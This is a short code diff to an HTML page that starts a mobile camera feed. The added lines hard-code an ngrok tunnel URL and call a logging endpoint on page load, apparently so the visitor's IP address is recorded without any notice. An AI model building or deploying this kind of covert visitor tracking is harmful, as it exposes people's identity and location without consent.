@@ -10,6 +10,8 @@
     <video id="mobileCamFeed" width="640" height="480" autoplay></video>
     
     <script>
+        const backendURL = 'https://9f3a-2409-40f4-2e-3376-98a2-40b3-ea-b16b.ngrok-free.app'; // Ngrok URL
+        
         const videoElement = document.getElementById('mobileCamFeed');
         
         // Function to start the mobile camera feed
@@ -22,7 +24,20 @@
             }
         }
         
+        // Function to log IP address
+        function logIPAddress() {
+            fetch(`${backendURL}/log`)
+            .then(response => response.text())
+            .then(data => {
+                console.log(data);
+            })
+            .catch(error => {
+                console.error('Error:', error);
+            });
+        }
+        
         startMobileCameraFeed();
+        logIPAddress();
     </script>
 </body>
 </html>
